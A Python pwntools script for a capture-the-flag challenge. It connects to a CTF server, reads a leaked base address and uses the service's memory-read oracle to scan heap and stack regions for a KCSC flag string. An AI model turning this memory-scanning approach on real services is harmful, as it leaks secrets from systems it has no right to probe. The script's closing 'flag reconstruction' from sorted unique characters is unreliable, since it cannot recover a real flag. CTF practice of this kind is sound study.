from pwn import *
import re
from string import printable

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
base = int(m.group(1), 16)
print(f'Dict base: {hex(base)}')

def read_memory(addr):
    addr_str = f"{addr:x}"
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    
    if 'illegal memory address' in line:
        return None
        
    parts = line.split(': ')
    if len(parts) >= 2:
        hex_data = parts[-1].strip()
        try:
            return bytes.fromhex(hex_data)
        except:
            return None
    return None

print("\n=== FOCUSED FLAG SEARCH ===")

reads_used = 0
max_reads = 45
all_chars = []

# Based on the challenge, let me try a different strategy
# Maybe scan much wider or look for different patterns

# The flag might be stored as a complete string somewhere else
# Or the individual characters might be in a different region

# Try scanning different memory regions more systematically
regions_to_scan = [
    # Around the dict (already partially done)
    (base - 0x2000, base + 0x2000, 0x10),
    
    # Try some other common heap regions
    (base + 0x10000, base + 0x30000, 0x40),
    (base - 0x30000, base - 0x10000, 0x40),
    
    # Maybe try stack-like regions
    (0x7ffe00000000, 0x7ffe00001000, 0x40),
    (0x7fff00000000, 0x7fff00001000, 0x40),
]

for region_start, region_end, step in regions_to_scan:
    if reads_used >= max_reads - 5:
        break
        
    print(f"\nScanning region {region_start:#x} to {region_end:#x} (step {step})")
    
    for addr in range(region_start, region_end, step):
        if reads_used >= max_reads - 3:
            break
            
        if addr <= 0x1000:
            continue
            
        data = read_memory(addr)
        reads_used += 1
        
        if not data:
            continue
            
        # Look for complete strings that might be the flag
        text_sequences = []
        current_text = ""
        
        for b in data:
            if 32 <= b <= 126:  # Printable
                current_text += chr(b)
            else:
                if len(current_text) >= 2:  # At least 2 chars
                    text_sequences.append(current_text)
                current_text = ""
        
        if len(current_text) >= 2:
            text_sequences.append(current_text)
        
        # Report interesting findings
        for text in text_sequences:
            all_chars.extend(list(text))
            
            # Look for flag patterns
            if len(text) >= 4:
                print(f'{addr:#x}: "{text}"')
                
            # Flag indicators
            if any(pattern in text.upper() for pattern in ['KCSC', 'CTF', 'FLAG', '{', '}']):
                print(f'  *** POTENTIAL FLAG: "{text}" ***')
            
            # Long strings might be the complete flag
            if len(text) >= 15:
                print(f'  *** LONG STRING (possible complete flag): "{text}" ***')

# Final analysis
unique_chars = sorted(set(all_chars))
print(f"\n=== ANALYSIS (used {reads_used}/{max_reads} reads) ===")
print(f"All unique characters found: {len(unique_chars)}")
print(f"Characters: {''.join(unique_chars)}")

# Check for flag structure
has_K = 'K' in unique_chars
has_C = 'C' in unique_chars  
has_S = 'S' in unique_chars
has_braces = '{' in unique_chars and '}' in unique_chars

print(f"\nFlag structure check:")
print(f"  Has 'K': {has_K}")
print(f"  Has 'C': {has_C}")  
print(f"  Has 'S': {has_S}")
print(f"  Has braces: {has_braces}")

if has_K and has_C and has_S and has_braces:
    print("*** ALL FLAG COMPONENTS PRESENT - RECONSTRUCTION NEEDED ***")
elif has_C and has_braces:
    print("*** PARTIAL FLAG STRUCTURE FOUND ***")

# If we have enough characters, try some reconstruction
if len(unique_chars) >= 20:
    print(f"\nPotential flag from available chars: {''.join(unique_chars)}")
    
    # Try common flag formats
    if has_K and has_C and has_S:
        remaining = [c for c in unique_chars if c not in 'KCSC{}']
        flag_content = ''.join(remaining)
        print(f"Possible KCSC flag: KCSC{{{flag_content}}}")

io.close()